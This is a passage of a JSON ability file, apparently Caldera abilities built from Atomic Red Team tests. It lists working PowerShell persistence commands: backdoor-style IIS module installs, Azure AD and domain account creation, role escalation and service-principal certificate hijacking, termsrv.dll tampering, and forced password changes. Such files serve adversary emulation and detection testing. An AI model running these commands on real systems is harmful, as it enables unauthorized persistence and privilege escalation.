                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "8aabc61664e947c69058c3df4f3af860",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "8aabc61664e947c69058c3df4f3af860"
    },
    "T1505.004__persistence__IIS Components__e8c24e75714483eb3b526fc589a88f9a": {
        "description": "The following Atomic will utilize PowerShell Cmdlet New-WebGlobalModule to install a new IIS Module. IIS must be installed.\nThis atomic utilizes a DLL on disk, but to test further suspiciousness, compile and load [IIS-Raid](https://www.mdsec.co.uk/2020/02/iis-raid-backdooring-iis-using-native-modules/).\nA successful execution will install a module into IIS using New-WebGlobalModule.\n[Managing IIS Modules with PowerShell](https://learn.microsoft.com/en-us/powershell/module/webadministration/set-webglobalmodule?view=windowsserver2022-ps)\n[IIS Modules](https://www.microsoft.com/en-us/security/blog/2022/12/12/iis-modules-the-evolution-of-web-shells-and-how-to-detect-them/)\n",
        "tactic": "persistence",
        "technique": {
            "attack_id": "T1505.004",
            "name": "IIS Components"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-WebGlobalModule -Name DefaultDocumentModule_Atomic",
                    "command": "New-WebGlobalModule -Name DefaultDocumentModule_Atomic -Image %windir%\\system32\\inetsrv\\defdoc.dll",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "e8c24e75714483eb3b526fc589a88f9a",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "e8c24e75714483eb3b526fc589a88f9a"
    },
    "T1136.003__persistence__Create Account: Cloud Account__20e4f555f0b87421c9e9ec83d99eb562": {
        "description": "Creates a new user in Azure AD. Upon successful creation, a new user will be created. Adversaries create new users so that their malicious activity does not interrupt the normal functions of the compromised users and can remain undetected for a long time.",
        "tactic": "persistence",
        "technique": {
            "attack_id": "T1136.003",
            "name": "Create Account: Cloud Account"
        },
        "platforms": {
            "unknown": {
                "psh": {
                    "cleanup": "Remove-AzureADUser -ObjectId \"atomicredteam@yourdomain.com\"",
                    "command": "Connect-AzureAD; $userprincipalname = \"atomicredteam@yourdomain.com\"; $username = \"atomicredteam\"      ; $password = \"reallylongcredential12345ART-ydsfghsdgfhsdgfhgsdhfg\"; $PasswordProfile = New-Object -TypeName Microsoft.Open.AzureAD.Model.PasswordProfile; $PasswordProfile.Password = $password; New-AzureADUser -DisplayName $username -PasswordProfile $PasswordProfile -UserPrincipalName $userprincipalname -AccountEnabled $true -MailNickName $username",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "20e4f555f0b87421c9e9ec83d99eb562",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "20e4f555f0b87421c9e9ec83d99eb562"
    },
    "T1176__persistence__Browser Extensions__70f8b4c0be2ee69f07592eee0aa5acc0": {
        "description": "This test loads an unpacked extension in Google Chrome with the `--load-extension` parameter. This technique was previously used by the Grandoreiro malware to load a malicious extension that would capture the browsing history, steal cookies and other user information. Other malwares also leverage this technique to hijack searches, steal passwords, inject ads, and more.\n\nReferences:\nhttps://attack.mitre.org/techniques/T1176/\nhttps://securityintelligence.com/posts/grandoreiro-malware-now-targeting-banks-in-spain/",
        "tactic": "persistence",
        "technique": {
            "attack_id": "T1176",
            "name": "Browser Extensions"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Set-Location \"$env:TEMP\"; Stop-Process -Name chrome -Force; Remove-Item .\\chrome.zip, .\\chrome-win, .\\extension, .\\extension.zip -Recurse -Force; Set-Variable ProgressPreference Continue",
                    "command": "$chromium =  \"https://commondatastorage.googleapis.com/chromium-browser-snapshots/Win_x64/1153778/chrome-win.zip\"; $extension = \"https://github.com/gorhill/uBlock/releases/download/uBOLite_0.1.23.6055/uBOLite_0.1.23.6055.chromium.mv3.zip\"; Set-Location \"$env:TEMP\"; Set-Variable ProgressPreference SilentlyContinue; Invoke-WebRequest -URI $chromium -OutFile \"$env:TEMP\\chrome.zip\"; Invoke-WebRequest -URI $extension -OutFile \"$env:TEMP\\extension.zip\"; Expand-Archive chrome.zip -DestinationPath \"$env:TEMP\" -Force; Expand-Archive extension.zip -Force; Start-Process .\\chrome-win\\chrome.exe --load-extension=\"$env:TEMP\\extension\\\" -PassThru",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "70f8b4c0be2ee69f07592eee0aa5acc0",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "70f8b4c0be2ee69f07592eee0aa5acc0"
    },
    "T1098.003__persistence__Account Manipulation: Additional Cloud Roles__64c11bc729e5b99c282d4abd4d51b3fc": {
        "description": "Add an existing Azure user account the Company Administrator Role.\n",
        "tactic": "persistence",
        "technique": {
            "attack_id": "T1098.003",
            "name": "Account Manipulation: Additional Cloud Roles"
        },
        "platforms": {
            "unknown": {
                "psh": {
                    "cleanup": "Remove-MsolRoleMember -RoleName \"Company Administrator\" -RoleMemberType User -RoleMemberEmailAddress \"default\"",
                    "command": "Import-Module MSOnline; $Password = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Password; Connect-MsolService -Credential $Credential; Add-MsolRoleMember -RoleName \"Company Administrator\" -RoleMemberEmailAddress \"default\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "64c11bc729e5b99c282d4abd4d51b3fc",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "64c11bc729e5b99c282d4abd4d51b3fc"
    },
    "T1098__persistence__Account Manipulation__bac18f187778e4202196ddd3c6041d31": {
        "description": "The adversaries want to add service principal to some Azure role, also called Azure resource role. Threat actor \nmay be interested primarily in highly privileged roles, e.g. Owner, Contributor.\nBy default, the role Reader is assigned to service principal in this test.\n\nNew-AzRoleAssignment cmdlet could be also use to assign user/service principal to resource, resource group and management group.\n\nThe account you use to run the PowerShell command must have Microsoft.Authorization/roleAssignments/write \n(e.g. such as User Access Administrator or Owner) and the Azure Active Directory Graph Directory.Read.All \nand Microsoft Graph Directory.Read.All permissions.\n\nDetection hint - check Operation Name \"Create role assignment\" in subscriptions Activity Logs.\n",
        "tactic": "persistence",
        "technique": {
            "attack_id": "T1098",
            "name": "Account Manipulation"
        },
        "platforms": {
            "unknown": {
                "psh": {
                    "cleanup": "Import-Module -Name AzureAD -ErrorAction Ignore; $PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword; Connect-AzAccount -Credential $Credential -ErrorAction Ignore; $sp = Get-AzADServicePrincipal | where-object {$_.DisplayName -eq \"SuperSP\"}; if ($sp -eq $null) { Write-Warning \"Service Principal not found\"; exit }; $subscription = Get-AzSubscription | where-object {$_.Name -eq \"Azure subscription 1\"} ; if ($subscription -eq $null) { Write-Warning \"Subscription not found\"; exit }; $role = Get-AzRoleDefinition | where-object {$_.Name -eq \"Reader\"}; if ($role -eq $null) { Write-Warning \"Role not found\"; exit }; Remove-AzRoleAssignment -ObjectId $sp.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription; Write-Host \"Service Principal $($sp.DisplayName) was removed from $($role.Name) role in subscriptions $($subscriptions.Name)\"",
                    "command": "try {if (Get-InstalledModule -Name Az.Resources -ErrorAction SilentlyContinue) { ; } else {Install-Module -Name Az.Resources -Force};  ;  Import-Module -Name Az.Resources; $PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword; Connect-AzAccount -Credential $Credential; $sp = Get-AzADServicePrincipal | where-object {$_.DisplayName -eq \"SuperSP\"}; if ($sp -eq $null) { Write-Warning \"Service Principal not found\"; exit }; $subscription = Get-AzSubscription | where-object {$_.Name -eq \"Azure subscription 1\"} ; if ($subscription -eq $null) { Write-Warning \"Subscription not found\"; exit }; $role = Get-AzRoleDefinition | where-object {$_.Name -eq \"Reader\"}; if ($role -eq $null) { Write-Warning \"Role not found\"; exit }; New-AzRoleAssignment -ObjectId $sp.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription; Write-Host \"Service Principal $($sp.DisplayName) was added to $($role.Name) role in subscriptions $($subscriptions.Name)\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "bac18f187778e4202196ddd3c6041d31",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "bac18f187778e4202196ddd3c6041d31"
    },
    "T1098.001__persistence__Account Manipulation: Additional Cloud Credentials__7d46c4731c7b6ade58e43877e4b7dc66": {
        "description": "Add a certificate to an Application through its Service Principal. The certificate can then be used to authenticate as the application.\nThis can be used for persistence, and also for privilege escalation by benefiting from the Application's rights.\nAn account with high-enough Azure AD privileges is needed, such as Global Administrator or Application Administrator. The account authentication must be without MFA.\n",
        "tactic": "persistence",
        "technique": {
            "attack_id": "T1098.001",
            "name": "Account Manipulation: Additional Cloud Credentials"
        },
        "platforms": {
            "unknown": {
                "psh": {
                    "cleanup": "Import-Module -Name AzureAD -ErrorAction Ignore; $PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword; Connect-AzureAD -Credential $Credential -ErrorAction Ignore > $null; $sp = Get-AzureADServicePrincipal -SearchString \"SuperSP\" | Select-Object -First 1; $credz = Get-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId; foreach ($cred in $credz) {;   if ([System.Text.Encoding]::ASCII.GetString($cred.CustomKeyIdentifier) -eq \"AtomicTest\") {;     Write-Host \"Removed $($cred.KeyId) key from SP\";     Remove-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -KeyId $cred.KeyId;   }  ; }; Get-ChildItem -Path Cert:\\CurrentUser\\My | where { $_.FriendlyName -eq \"AtomicCert\" } | Remove-Item",
                    "command": "Import-Module -Name AzureAD; $PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword; Connect-AzureAD -Credential $Credential > $null; $sp = Get-AzureADServicePrincipal -SearchString \"SuperSP\" | Select-Object -First 1; if ($sp -eq $null) { Write-Warning \"Service Principal not found\"; exit }; $credNotAfter = (Get-Date).AddDays(1); $certNotAfter = (Get-Date).AddDays(2); $cert = New-SelfSignedCertificate -DnsName \"atomicredteam.example.com\" -FriendlyName \"AtomicCert\" -CertStoreLocation Cert:\\CurrentUser\\My -KeyExportPolicy Exportable -Provider \"Microsoft Enhanced RSA and AES Cryptographic Provider\" -NotAfter $certNotAfter; $keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData()); Write-Host \"Generated certificate \"\"$($cert.Thumbprint)\"\"\"; New-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \"AtomicTest\" -Usage Verify -Value $keyValue -EndDate $credNotAfter; Start-Sleep -s 30; $tenant = Get-AzureADTenantDetail; $auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $sp.AppId -CertificateThumbprint $cert.Thumbprint; Write-Host \"Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\"; Write-Host \"End of Hijacking\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "7d46c4731c7b6ade58e43877e4b7dc66",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "7d46c4731c7b6ade58e43877e4b7dc66"
    },
    "T1505.005__persistence__Server Software Component: Terminal Services DLL__7cd26e24cc23c5a7e1183120fa034f89": {
        "description": "Simulates patching of termsrv.dll by making a benign change to the file and replacing it with the original afterwards.\nBefore we can make the modifications we need to take ownership of the file and grant ourselves the necessary permissions.\n",
        "tactic": "persistence",
        "technique": {
            "attack_id": "T1505.005",
            "name": "Server Software Component: Terminal Services DLL"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Move-Item -Path \"C:\\Windows\\System32\\termsrv_backup.dll\" -Destination \"C:\\Windows\\System32\\termsrv.dll\" -Force -ErrorAction Ignore",
                    "command": "$ACL = Get-Acl $fileName; $permission = \"Administrators\",\"FullControl\",\"Allow\"; $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission; $ACL.SetAccessRule($accessRule); Set-Acl -Path $fileName -AclObject $ACL; Copy-Item -Path \"C:\\Windows\\System32\\termsrv.dll\" -Destination \"C:\\Windows\\System32\\termsrv_backup.dll\" -ErrorAction Ignore; Add-Content -Path \"C:\\Windows\\System32\\termsrv.dll\" -Value \"`n\" -NoNewline -ErrorAction Ignore; Move-Item -Path \"C:\\Windows\\System32\\termsrv_backup.dll\" -Destination \"C:\\Windows\\System32\\termsrv.dll\" -Force -ErrorAction Ignore",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "7cd26e24cc23c5a7e1183120fa034f89",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "7cd26e24cc23c5a7e1183120fa034f89"
    },
    "T1136.002__persistence__Create Account: Domain Account__8a95e17c084e9a8bf41c69c73beeb0af": {
        "description": "Creates a new Domain User using the credentials of the Current User\n",
        "tactic": "persistence",
        "technique": {
            "attack_id": "T1136.002",
            "name": "Create Account: Domain Account"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "cmd /c \"net user T1136.002_Admin /del >nul 2>&1\"",
                    "command": "$SamAccountName = 'T1136.002_Admin'; $AccountPassword = ConvertTo-SecureString 'T1136_pass123!' -AsPlainText -Force; Add-Type -AssemblyName System.DirectoryServices.AccountManagement; $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain); $User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($Context); $User.SamAccountName = $SamAccountName; $TempCred = New-Object System.Management.Automation.PSCredential('a', $AccountPassword); $User.SetPassword($TempCred.GetNetworkCredential().Password); $User.Enabled = $True; $User.PasswordNotRequired = $False; $User.DisplayName = $SamAccountName; $User.Save(); $User",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "8a95e17c084e9a8bf41c69c73beeb0af",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "8a95e17c084e9a8bf41c69c73beeb0af"
    },
    "T1098__persistence__Account Manipulation__53187e13ccee0b0d71451ca3fdc1f9d9": {
        "description": "Attempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this atomic test to verify that your password policy is blocking the use of the new password.\nIf the password is succesfully changed to the new password, the credential file will be updated to reflect the new password. You can then run the atomic manually and specify a new password of your choosing, however the\npassword policy will likely prevent you from setting the password back to what it was. \n",
        "tactic": "persistence",
        "technique": {
            "attack_id": "T1098",
            "name": "Account Manipulation"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "if (Test-Path $env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt) { ; } else {New-Item -Type Directory (split-path \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\") -ErrorAction Ignore | Out-Null; $cred = Get-Credential -UserName  $env:USERNAME -message \"Enter password for $env:USERNAME to use during password change attempt\"; $cred.Password | ConvertFrom-SecureString | Out-File \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"};  ;  $credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"; if (Test-Path $credFile) {;     $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString);     if($cred.GetNetworkCredential().Password -eq \"onlyUPandLowChars\"){;       Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1;     };     try {;         $newPassword = ConvertTo-SecureString onlyUPandLowChars -AsPlainText -Force;         Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword;     };     catch { ;         $_.Exception;         $errCode = $_.Exception.ErrorCode;         Write-Host \"Error code: $errCode\";         if ($errCode -eq 86) {;             Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\";             Remove-Item $credFile;         };         exit $errCode;     };     Write-Host -ForegroundColor Cyan \"Successfully changed the password to onlyUPandLowChars\";     $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"onlyUPandLowChars\" -AsPlainText -Force));     $newCred.Password | ConvertFrom-SecureString | Out-File $credFile; }; else {;     Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"; }",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "53187e13ccee0b0d71451ca3fdc1f9d9",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "53187e13ccee0b0d71451ca3fdc1f9d9"
    },
    "T1098__persistence__Account Manipulation__0690e0818b5749092595a472831f362f": {
        "description": "Attempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this atomic test to verify that your password policy is blocking the use of the new password.\nIf the password is succesfully changed to the new password, the credential file will be updated to reflect the new password. You can then run the atomic manually and specify a new password of your choosing, however the\npassword policy will likely prevent you from setting the password back to what it was. \n",
        "tactic": "persistence",
        "technique": {
            "attack_id": "T1098",
            "name": "Account Manipulation"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "if (Test-Path $env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt) { ; } else {New-Item -Type Directory (split-path \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\") -ErrorAction Ignore | Out-Null; $cred = Get-Credential -UserName  $env:USERNAME -message \"Enter password for $env:USERNAME to use during password change attempt\"; $cred.Password | ConvertFrom-SecureString | Out-File \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"};  ;  $credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"; if (Test-Path $credFile) {;     $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString);     if($cred.GetNetworkCredential().Password -eq \"UPPER-LONG-SPECIAL-333\"){;       Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1;     };     try {;         $newPassword = ConvertTo-SecureString UPPER-LONG-SPECIAL-333 -AsPlainText -Force;         Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword;     };     catch { ;         $_.Exception;         $errCode = $_.Exception.ErrorCode;         Write-Host \"Error code: $errCode\";         if ($errCode -eq 86) {;             Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\";             Remove-Item $credFile;         };         exit $errCode;     };     Write-Host -ForegroundColor Cyan \"Successfully changed the password to UPPER-LONG-SPECIAL-333\";     $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"UPPER-LONG-SPECIAL-333\" -AsPlainText -Force));     $newCred.Password | ConvertFrom-SecureString | Out-File $credFile; }; else {;     Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"; }",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "0690e0818b5749092595a472831f362f",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "0690e0818b5749092595a472831f362f"
    },
    "T1098__persistence__Account Manipulation__c736f0cee0c30c06095fedc05fa83912": {
        "description": "The adversaries want to add service principal to some Azure AD role. Threat actor \nmay be interested primarily in highly privileged roles, e.g. Global Administrator, Application Administrator, \nPrivileged Authentication Administrator (this role can reset Global Administrator password!).\nBy default, the role Global Reader is assigned to service principal in this test.\n\nThe account you use to run the PowerShell command should have Privileged Role Administrator or Global Administrator role in your Azure AD.\n\nDetection hint - check Activity \"Add member to role\" in Azure AD Audit Logs. In targer you will also see Service Principal as a type.\n",
        "tactic": "persistence",
        "technique": {
            "attack_id": "T1098",
            "name": "Account Manipulation"
        },
        "platforms": {
            "unknown": {
                "psh": {
                    "cleanup": "Import-Module -Name AzureAD -ErrorAction Ignore; $PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword; Connect-AzureAD -Credential $Credential -ErrorAction Ignore; $sp = Get-AzureADServicePrincipal -Filter \"DisplayName eq 'SuperSP'\"; if ($sp -eq $null) { Write-Warning \"Service Principal not found\"; exit }; $role = Get-AzureADDirectoryRole -Filter \"DisplayName eq 'Global Reader'\"; if ($role -eq $null) { Write-Warning \"Role not found\"; exit }; Remove-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -MemberId $sp.ObjectId; Write-Host \"Service Principal $($sp.DisplayName) was removed from $($role.DisplayName) role\"",
                    "command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) { ; } else {Install-Module -Name AzureAD -Force};  ;  Import-Module -Name AzureAD; $PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword; Connect-AzureAD -Credential $Credential; $sp = Get-AzureADServicePrincipal -Filter \"DisplayName eq 'SuperSP'\"; if ($sp -eq $null) { Write-Warning \"Service Principal not found\"; exit }; $role = Get-AzureADDirectoryRole -Filter \"DisplayName eq 'Global Reader'\"; if ($role -eq $null) { Write-Warning \"Role not found\"; exit }; Add-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -RefObjectId $sp.ObjectId; Write-Host \"Service Principal $($sp.DisplayName) was added to $($role.DisplayName)\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "c736f0cee0c30c06095fedc05fa83912",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "c736f0cee0c30c06095fedc05fa83912"
    },
    "T1098__persistence__Account Manipulation__015d186adee85e65d7255b383e1a039f": {
        "description": "Attempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this atomic test to verify that your password policy is blocking the use of the new password.\nIf the password is succesfully changed to the new password, the credential file will be updated to reflect the new password. You can then run the atomic manually and specify a new password of your choosing, however the\npassword policy will likely prevent you from setting the password back to what it was. \n",
        "tactic": "persistence",
        "technique": {
            "attack_id": "T1098",
            "name": "Account Manipulation"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "if (Test-Path $env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt) { ; } else {New-Item -Type Directory (split-path \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\") -ErrorAction Ignore | Out-Null; $cred = Get-Credential -UserName  $env:USERNAME -message \"Enter password for $env:USERNAME to use during password change attempt\"; $cred.Password | ConvertFrom-SecureString | Out-File \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"};  ;  $credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"; if (Test-Path $credFile) {;     $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString);     if($cred.GetNetworkCredential().Password -eq \"UpperLowerLong333noSpecialChar\"){;       Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1;     };     try {;         $newPassword = ConvertTo-SecureString UpperLowerLong333noSpecialChar -AsPlainText -Force;         Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword;     };     catch { ;         $_.Exception;         $errCode = $_.Exception.ErrorCode;         Write-Host \"Error code: $errCode\";         if ($errCode -eq 86) {;             Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\";             Remove-Item $credFile;         };         exit $errCode;     };     Write-Host -ForegroundColor Cyan \"Successfully changed the password to UpperLowerLong333noSpecialChar\";     $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"UpperLowerLong333noSpecialChar\" -AsPlainText -Force));     $newCred.Password | ConvertFrom-SecureString | Out-File $credFile; }; else {;     Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"; }",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "015d186adee85e65d7255b383e1a039f",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "015d186adee85e65d7255b383e1a039f"
    },
    "T1098__persistence__Account Manipulation__8862278ba483c0d5f719ffbc9186a901": {
        "description": "Attempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this atomic test to verify that your password policy is blocking the use of the new password.\nIf the password is succesfully changed to the new password, the credential file will be updated to reflect the new password.  You can then run the atomic manually and specify a new password of your choosing, however the\npassword policy will likely prevent you from setting the password back to what it was.\n",
        "tactic": "persistence",
        "technique": {
            "attack_id": "T1098",
            "name": "Account Manipulation"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "if (Test-Path $env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt) { ; } else {New-Item -Type Directory (split-path \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\") -ErrorAction Ignore | Out-Null; $cred = Get-Credential -UserName  $env:USERNAME -message \"Enter password for $env:USERNAME to use during password change attempt\"; $cred.Password | ConvertFrom-SecureString | Out-File \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"};  ;  $credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"; if (Test-Path $credFile) {;     $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString);     if($cred.GetNetworkCredential().Password -eq \"Uplow-1\"){;       Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1;     };     try {;         $newPassword = ConvertTo-SecureString Uplow-1 -AsPlainText -Force;         Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword;     };     catch { ;         $_.Exception;         $errCode = $_.Exception.ErrorCode;         Write-Host \"Error code: $errCode\";         if ($errCode -eq 86) {;             Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\";             Remove-Item $credFile;         };         exit $errCode;     };     Write-Host -ForegroundColor Cyan \"Successfully changed the password to Uplow-1\";     $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"Uplow-1\" -AsPlainText -Force));     $newCred.Password | ConvertFrom-SecureString | Out-File $credFile; }; else {;     Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"; }",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "8862278ba483c0d5f719ffbc9186a901",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "8862278ba483c0d5f719ffbc9186a901"
    },
    "T1098__persistence__Account Manipulation__9ef143154774a6d0d74e0828e90290ac": {
        "description": "Manipulate Admin Account Name\n",
        "tactic": "persistence",
        "technique": {
            "attack_id": "T1098",
            "name": "Account Manipulation"
        },
        "platforms": {
            "windows": {
                "psh": {
